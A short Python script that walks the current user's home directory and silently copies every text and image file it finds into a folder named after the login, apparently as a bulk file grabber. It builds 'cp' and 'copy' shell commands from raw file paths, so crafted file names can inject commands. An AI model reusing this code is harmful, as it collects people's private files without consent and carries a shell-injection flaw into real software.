# -*- coding: utf-8 -*-

from os import walk,getlogin,system,mkdir
from platform import uname

#returns the home path of user
def getPath():
	if uname()[0] == 'Linux':
		return '/home/'+getlogin()
	elif uname()[0] == 'Windows':
		return 'C:\\Users\\'+getlogin()
	raise Exception("os not found")
#Checks if the file is what we want
def valid(name):
	files = ['txt','jpg','jpeg','png','ico','icon'] #You can extend or remove
	temp = []
	counter = -1
	while (name[counter] != '.') and (abs(counter) < len(name)):
		temp.insert(0,name[counter])
		counter += -1
	if ''.join(temp) in files:
		return True
	return False
	
path=getPath()
try:
	mkdir(getlogin())
except FileExistsError:
	pass
for roots,dirs,files in walk(path):
	for name in files:
		if valid(name):
			if uname()[0] == "Linux":
				system('cp %s/%s %s/%s' % (roots,name,getlogin(),name))
			else:
				system('copy %s\\%s %s\\%s' % (roots,name,getlogin(),name))